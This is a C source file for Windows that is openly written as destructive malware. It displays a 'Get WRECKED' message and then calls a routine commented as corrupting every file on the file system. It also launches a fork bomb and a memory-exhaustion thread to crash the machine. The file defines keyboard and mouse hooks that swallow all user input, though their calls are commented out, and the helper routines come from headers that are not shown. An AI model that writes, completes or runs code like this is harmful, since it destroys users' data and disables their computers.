#include <stdio.h>
#include <windows.h>
#include "bombs.h"
#include "file_corrupt.h"



HHOOK hKeyboardHook;
HHOOK hMouseHook;

LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode >= 0) {
        // Discard all keyboard events
        return 1;
    }
    return CallNextHookEx(hKeyboardHook, nCode, wParam, lParam);
}

// Function to disable keyboard input
void DisableKeyboard() {
    hKeyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);
    if (hKeyboardHook == NULL) {
        MessageBox(NULL, "Failed to install keyboard hook!", "Error", MB_ICONERROR);
    }
}

LRESULT CALLBACK MouseProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode >= 0) {
        // Discard all mouse events
        return 1;
    }
    return CallNextHookEx(hMouseHook, nCode, wParam, lParam);
}

// Function to disable mouse input
void DisableMouse() {
    hMouseHook = SetWindowsHookEx(WH_MOUSE_LL, MouseProc, NULL, 0);
    if (hMouseHook == NULL) {
        MessageBox(NULL, "Failed to install mouse hook!", "Error", MB_ICONERROR);
    }
}


void main() {


    MessageBox(NULL, "Get WRECKED", "Warning msg", MB_OK | MB_ICONWARNING);

    //int cpuUsage;
    HANDLE hThread1, hThread2;   // Handles to the threads
    DWORD dwThreadId1, dwThreadId2; // Thread identifiers

    //corrupt every file on the file system
    traverseDir();

    //   DisableKeyboard();
    // DisableMouse();

    // // Message loop to keep the hooks active
    // MSG msg;
    // while (GetMessage(&msg, NULL, 0, 0)) {
    //     TranslateMessage(&msg);
    //     DispatchMessage(&msg);
    // }


    //start crashing the PC
    hThread1 = CreateThread(
        NULL,
        0,
        forkBomb,
        NULL,
        0,
        &dwThreadId1
    );

     hThread2 = CreateThread(
        NULL,
        0,
        memoryCrasher,
        NULL,
        0,
        &dwThreadId2
    );


    WaitForSingleObject(hThread1, INFINITE);
    WaitForSingleObject(hThread2, INFINITE);

    // Close the thread handles
    CloseHandle(hThread1);
    CloseHandle(hThread2);
 
}



